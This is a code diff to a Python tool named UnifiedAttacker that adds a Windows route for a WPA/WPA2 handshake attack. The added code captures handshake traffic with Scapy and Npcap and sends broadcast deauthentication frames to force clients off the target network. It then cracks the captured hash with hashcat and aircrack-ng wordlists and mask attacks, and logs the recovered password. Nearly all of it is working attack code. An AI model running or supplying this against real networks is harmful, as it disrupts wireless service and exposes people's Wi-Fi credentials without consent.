@@ -471,12 +471,20 @@ class UnifiedAttacker:
     def _phase_handshake(self) -> Optional[str]:
         self._log("--- Phase: WPA/WPA2 Handshake Attack ---", "phase")
 
+        cap_file = self._prefix("hs_cap.pcap")
+        hash_file = self._prefix("hs.hc22000")
+
+        if IS_WINDOWS:
+            # On Windows, airodump-ng fails because it calls the WLAN API at
+            # init time but wlansvc has been stopped.  Use scapy + Npcap instead.
+            return self._phase_handshake_windows(cap_file, hash_file)
+
+        # --- Linux path: airodump-ng ---
         if not check_tool("airodump-ng"):
             self._log("airodump-ng not found -- skipping handshake capture", "warn")
             return None
 
         prefix = self._prefix("hs_cap")
-        hash_file = self._prefix("hs.hc22000")
 
         self._log(
             f"Starting capture on '{self.target.ssid}' for {self.CAPTURE_SECS}s...", "info"
@@ -580,6 +588,121 @@ class UnifiedAttacker:
                 self.wordlist,
                 bssid=self.target.bssid,
                 ssid=self.target.ssid,
+            )
+            if key:
+                self._log(
+                    f"Handshake cracked (aircrack) -- password: {key}", "success"
+                )
+                return key
+
+        self._log("Handshake wordlist exhausted -- trying mask attacks...", "warn")
+        return self._crack_with_masks(hash_file, 22000)
+
+    # ------------------------------------------------------------------
+    # Phase: WPA/WPA2 Handshake (Windows — Scapy/Npcap capture)
+    # ------------------------------------------------------------------
+
+    def _phase_handshake_windows(self, cap_file: str, hash_file: str) -> Optional[str]:
+        """Windows replacement for airodump-ng: capture via Scapy + Npcap."""
+        from .pcap_utils import capture_pmkid_eapol, convert_pcap_to_hc22000
+
+        self._log(
+            f"Starting Scapy/Npcap capture on '{self.target.ssid}' "
+            f"for {self.CAPTURE_SECS}s...",
+            "info",
+        )
+
+        # Run capture in a thread so we can send deauth while it runs
+        cap_exc: list = []
+
+        def _do_cap() -> None:
+            try:
+                capture_pmkid_eapol(
+                    self._scapy_iface,
+                    cap_file,
+                    bssid_filter=self.target.bssid,
+                    timeout=self.CAPTURE_SECS,
+                )
+            except Exception as exc:
+                cap_exc.append(exc)
+
+        cap_thread = threading.Thread(target=_do_cap, daemon=True)
+        cap_thread.start()
+
+        # Wait briefly then send deauth to accelerate handshake
+        time.sleep(5)
+        if not self._stop.is_set():
+            self._log("Sending Scapy deauth frames to force client reconnection...", "info")
+            try:
+                import scapy.all as sc
+                dot11 = sc.Dot11(
+                    type=0, subtype=12,
+                    addr1="ff:ff:ff:ff:ff:ff",
+                    addr2=self.target.bssid,
+                    addr3=self.target.bssid,
+                )
+                frame = sc.RadioTap() / dot11 / sc.Dot11Deauth(reason=7)
+                sc.sendp(frame, iface=self._scapy_iface, count=10, inter=0.1, verbose=False)
+                self._log("Deauth frames sent", "info")
+            except Exception as exc:
+                self._log(f"Deauth failed (non-fatal): {exc}", "warn")
+
+        # Wait for capture to finish (or stop signal)
+        cap_thread.join(timeout=self.CAPTURE_SECS + 10)
+
+        if self._stop.is_set():
+            return None
+
+        if cap_exc:
+            self._log(f"Capture error: {cap_exc[0]}", "error")
+            return None
+
+        if not Path(cap_file).exists() or Path(cap_file).stat().st_size == 0:
+            self._log("No packets captured — no clients seen or handshake not triggered", "warn")
+            return None
+
+        # Convert pcap → hc22000
+        ok, msg = convert_pcap_to_hc22000(cap_file, hash_file)
+        self._log(msg, "success" if ok else "warn")
+        if not ok:
+            return None
+
+        has_hs, _ = aircrack.check_handshake(cap_file)
+        self._log(
+            "Handshake confirmed!" if has_hs else "Attempting crack on captured data...",
+            "success" if has_hs else "info",
+        )
+
+        # Try hashcat first (faster with GPU)
+        if check_tool("hashcat") and self.wordlist:
+            hash_path = Path(hash_file)
+            if hash_path.exists() and hash_path.stat().st_size > 0:
+                self._log(
+                    f"hashcat -m 22000 | wordlist: {Path(self.wordlist).name}", "info"
+                )
+                self._stream(
+                    [
+                        "hashcat", "-m", "22000", hash_file, self.wordlist,
+                        "--force", "--quiet",
+                    ],
+                    timeout=self.CRACK_TIMEOUT,
+                    cwd=get_hashcat_dir(),
+                )
+                if not self._stop.is_set():
+                    ok2, out = hashcat_tool.show_cracked(hash_file, 22000)
+                    if ok2 and out.strip():
+                        password = out.strip().split(":")[-1]
+                        self._log(
+                            f"Handshake cracked (hashcat) -- password: {password}", "success"
+                        )
+                        return password
+
+        # Fallback: aircrack-ng CPU dictionary attack (uses cap file)
+        if check_tool("aircrack-ng") and self.wordlist and not self._stop.is_set():
+            self._log("Falling back to aircrack-ng dictionary attack...", "info")
+            ok3, _, key = aircrack.crack_wpa(
+                cap_file, self.wordlist,
+                bssid=self.target.bssid, ssid=self.target.ssid,
             )
             if key:
                 self._log(
